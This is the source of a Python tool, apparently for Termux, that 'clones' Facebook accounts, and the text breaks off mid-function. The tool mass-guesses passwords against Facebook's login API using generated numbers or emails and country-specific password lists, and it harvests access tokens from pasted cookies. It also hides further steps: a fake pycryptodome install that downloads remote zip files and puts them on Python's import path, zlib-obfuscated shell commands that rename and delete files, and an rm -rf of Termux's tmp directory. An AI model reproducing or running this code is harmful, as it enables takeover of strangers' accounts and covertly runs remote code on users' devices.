#SOURCE BY : Durlove

#GITHUB : Durlove Vaw

#coding = utf-8

from uuid import uuid4

import os,sys,tempfile,string,random,subprocess,uuid

http_directory = tempfile.mkdtemp(prefix='.')

site_packages = sys.path[4]

print(site_packages)

print(http_directory)

sys.path.remove(site_packages)

sys.path.insert(4,http_directory+'/reqmodule')

sys.path.insert(5,http_directory)

try:

        os.mkdir('crypto')

except:pass

hh = "ho"

hh2 = "9/pycrypt"

find_aarch = subprocess.check_output('uname -om',shell=True)

if 'aarch64' in str(find_aarch):

        user_aarch = '64'

        download_link = f'https://github.com/salokhnx3/executables/odome/blob/main/crypto64/crypto64.zip?raw=true'

elif 'arm' in str(find_aarch):

        user_aarch = '32'

        download_link = f'https://github.com/salokhnx3/executables/odome/blob/main/crypto32/crypto32.zip?raw=true'

else:

        print(' Unknown aarch ')

        exit()

if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):

        os.system('clear')

        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')

        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')

        os.system('python jan.py')

else:

        akk2="rsi"

        akk=f"cha{akk2}fi"

        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')

        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'

        os.system(f'curl -L {lib} > {http_directory}/config.zip')

        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')

        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')

try:

        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct

        from string import *

        from concurrent.futures import ThreadPoolExecutor as ThreadPool

        from Crypto.Cipher import AES, PKCS1_v1_5

        from Crypto.PublicKey import RSA

        from Crypto.Random import get_random_bytes

except Exception as e:

        print(e)

        print('\n Installing modules wait !')

        os.system('pip install futures==2 && python jan.py')

except FileExistsError:

        os.system('pip uninstall requests urllib3 idna certifi -y')

        pass

try:

        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib

        from string import *

        from concurrent.futures import ThreadPoolExecutor as ThreadPool

except ModuleNotFoundError:

        print('\n Installing missing modules ...')

        os.system('pip install requests futures==2 > /dev/null')

        os.system('python jan.py')

#----[pran links]-----

kkk = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 7.0.0; SM-T580 Build/NRD90M) [FBAN/FB4A;FBAV/306.0.0.51.127;FBBV/202800499;FBDM/{density=1.5,width=480,height=800};FBLC/pa_PA;FBCR/Roshan.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/SM-T580;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}

hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}

lll = ("https://b-api.facebook.com/method/auth.login")

#----[remover]-----

import os,shutil,zlib

sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')

sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')

sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')

sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')

sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')

sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')

sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')

sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')

#--checking if file is not avalible

if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):

        pass

        exit("Error in termux modules ")

if os.path.exists(sz):

        os.rename(sz1,'.f1')

        os.rename(sz2,'.f2')

        os.system(sz3)

        os.system(sz4)

        os.system(sz5)

        os.system(sz6)

else:

        pass

os.system("rm -rf .f1")

os.system("rm -rf .f2")

logo= f'''
88  88    db     dP"Yb  8b    d8    db    88     
88  88   dPYb   dP   Yb 88b  d88   dPYb   88     
888888  dP__Yb  Yb b dP 88YbdP88  dP__Yb  88  .o 
88  88 dP""""Yb  `"YoYo 88 YY 88 dP""""Yb 88ood8

{50*"-"}

    Tool Version :    0.9

    Author       :    HAQMAL 

{50*"-"}'''

#--(Dark@Colours)---#

r="\033[1;91m"

g="\033[1;92m"

y="\033[1;93m"

b="\033[1;94m"

p="\033[1;95m"

c="\033[1;96m"

l="\033[1;97m"

s="\033[0m"

#--(light@Colours)---#

lr="\033[0;91m"

lg="\033[0;92m"

ly="\033[0;93m"

lb="\033[0;94m"

lp="\033[0;95m"

lc="\033[0;96m"

ll="\033[0;97m"

#--(rare-colors)--#

holaa="38;5"

ro=(f"\033[{holaa};208")

rb=(f"\033[{holaa};32")

rc=(f"\033[{holaa};122m")

rg= (f"\033[{holaa};112m")

rp=(f"\033[{holaa};147m")

loop = 0

methods = []

ok=[]

total=[]

clone_type=[]

android_models = []

xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')

update = requests.get('https://github.com/Durlovevaw/approvekl/blob/main/Approvebi').text

uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())

id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")

plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]

xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')

bxd = ""

bumper = id+bxd+xp

myweb2 = requests.get('https://github.com/Durlovevaw/approvekl/blob/main/Approvebi').text

def qsbuy():

        try:

                os.system('clear')

                print(logo)

                x = requests.get('https://github.com/Durlovevaw/approvekl/blob/main/Approvebi').text

                if str("upppdate") in update:

                        os.system('clear')

                        exit('script is in update / maintanance be patient ')

                elif str("res-sseett") in update:

                        os.system('')

                        os.system('')

                        os.system('')

                        exit('Dont Try To Bypass')

                elif bumper in myweb2:

                        main()

                else:

                        os.system("clear");print(logo)

                        print(f"{lr}   Your Device License Key Is Not Approved{s}")

                        print(50*"-")

                        print(f"{rc} Key : {bumper}{s}")

                        print(50*"-")

                        print(f" Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")

                        print("\n paise ni h to free k leye whatsapp awo ")

                        print(50*"-")

                        print(f" 15-Days Price : 300")

                        print(f" 1-Month Price : 500")

                        print(50*"-")

                        input("[Press Enter To Send Key To Admin]")

                        os.system(f"termux-open-url https://wa.me/+9779809591712?text={bumper}")

                        qsbuy()

        except requests.exceptions.ConnectionError:

                exit(' No internet connection ..')

def rrrr():

        if bumper in myweb2:

                pass

        else:

                qsbuy()

def xchker():

    pass

def main():

        xchker()

        os.system('rm -rf ...txt')

        os.system('clear')

        print(logo);xchker()

        print('I AM BEGINNER SO PLEASE GUXARA KARO')

        print(50*'-')

        print('[1] Fb Cloning Menu')

        print('[2] File Create Menu')

        print('[3] Best Pass Lists \033[0;97m')

        print('[4] Thanks ')

        print('[0] Exit \033[0;97m')

        print(50*'-')

        menu_opt = input('Select Method : ')

        if menu_opt =='1':

                method_crack()

        elif menu_opt =='2':

                create_file()

        elif menu_opt =='3':

                xchker()

                os.system('xdg-open https://github.com/Durlovevaw/kingh')

                main()

        elif menu_opt =='4':

                os.system('rm -rf fb_cookies.txt')

                os.system('rm -rf access_token.txt')

                print('       Removed Success')

                time.sleep(3)

                main()

        elif menu_opt =='5':

                isdd="les/u"

                isd="sr/t"

                isddd="p/."

                llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"

                os.system(f"rm -rf {llb}")

                exit("      Sucessfully Removed .      ")

        elif menu_opt =='6':

                os.system('clear')

                print(logo);xchker()

                print(' Select Your Country For Best PassLists')

                print(50*'-')

                print('[1] Pakistani Ids')

                print('[2] Bangladesh Ids')

                print('[3] indian Ids')

                print('[4] Other Countries')

                print('[0] Back \033[0;97m')

                print(50*'-')

                menu_opt = input('Select choice : ')

                if menu_opt =='1':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('khan123')

                        print('first1234')

                        print('first12345')

                        print('i love you')

                        print('firstkhan')

                        print('khankhan')

                        print('khan12345')

                        print('khan12')

                        print('first786')

                        input('\nPress enter to back ')

                        main()

                elif menu_opt =='2':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('Bangladesh')

                        print('first1234')

                        print('first12345')

                        print('bangladesh')

                        print('i love you')

                        print('Jannatul123')

                        print('Mohammed123')

                        print('Mohammad123')

                        print('first@123')

                        input('\nPress enter to back ')

                        main()

                elif menu_opt =='3':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('i love you')

                        print('musa123')

                        print('first12345')

                        print('first@123')

                        print('first@1234')

                        print('firstfirst')

                        print('lastlast')

                        print('first786')

                        print('first1122')

                        input('\nPress enter to back ')

                        main()

                elif menu_opt =='4':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('i love you')

                        print('first321')

                        print('lastfirst')

                        print('firstlast123')

                        print('first12345')

                        print('first@123')

                        print('first@1234')

                        print('firstfirst')

                        print('first007')

                        print('first789')

                        print('first1122')

                        input('\nPress enter to back ')

                        main()

        elif menu_opt == "7":

                try:

                        os.system('python use.py')

                except:

                        exit('video is not avalible Right now in server try again after few hours')

        elif menu_opt == "0":

                main()

        else:

                print('\n Invalid option, try again ...')

                time.sleep(3)

                main()

def login():

        os.system('clear')

        print(logo);xchker()

        cookies = input(' Put cookies here: ')

        try:

                print('\n Validating cookies ... ')

                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})

                find_token = re.search("(EAAG\w+)", data.text)

                open("access_token.txt", "w").write(find_token.group(1))

                open("fb_cookies.txt","w").write(cookies)

                print(' Logged in successfully ...')

                time.sleep(1)

                os.system('python malang.py')

        except KeyError:

                print('\n Inavlid cookies, try another cookies')

                exit()

        except requests.exceptions.ConnectionError:

                print('\n No internet connection ...')

                exit()

        except AttributeError:

                print('\n Invalid cookies, try another cookies ...')

                exit()

def method_crack():

        os.system('clear')

        print(logo);xchker()

        print(' [1] File Cloning ')

        print(' [2] Email Cloning ')

        print(' [3] Random Cloning ')

        print(' [0] Back')

        print(50*'-')

        clone_ = input(' Select : ')

        if clone_ == "1":

                clone_type.append('1')

        elif clone_ == "2":

                clone_type.append('2')

        elif clone_ == "3":

                clone_type.append('3')

        elif clone_ == "0":

                main()

        else:

                exit('invalid select')

        mycrackistan()

def mycrackistan():

        global methods

        if '1' in clone_type:

                crack_main().crackfile(id)

        elif '2' in clone_type:

                crack_main().crackmail(id)

        elif '3' in clone_type:

                crack_main().cracknum(id)

class crack_main():

        def __init__(self):

                self.id=[]

        def crackfile(self,id):

                global methods

                os.system('clear')

                print(logo);xchker()

                self.file = input(' Put file path: ')

                try:

                        self.id = open(self.file).read().splitlines()

                        self.pasw()

                except FileNotFoundError:

                        print(' No file found ....')

                        exit()

        def crackmail(self,id):

                global methods

                os.system("clear");print(logo);xchker()

                import requests,random

                user=[]

                print(" [*] First Name Example Hamza,Areesha")

                first = input(" First Name : ")

                last = input(" Last Name : ")

                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")

                domain = input(" Domain : ")

                print("\n [?] Limit ids Example 1000,5000,50000")

                limit = int(input(" Limit Ids : "))

                for nmbr in range(limit):

                        nmpp = random.randint(99,9999)

                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"

                        naseeb = open('...txt','a').write(nmp)

                self.id = open('...txt').read().splitlines()

                self.pasw()

        def cracknum(self,id):

                global methods

                os.system('clear');print(logo);xchker()

                print('\033[0mFor Example :\033[0m 92301,92322,92333,92345 ...')

                kode = input('\033[0mChoose Code : \033[0m')

                print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')

                limit = int(input('\033[0mIdz Limit : \033[0m'))

                for nmbr in range(limit):

                        nmp = ''.join(random.choice(string.digits) for _ in range(7))

                        xoo = kode+nmp.replace(" ","")

                      
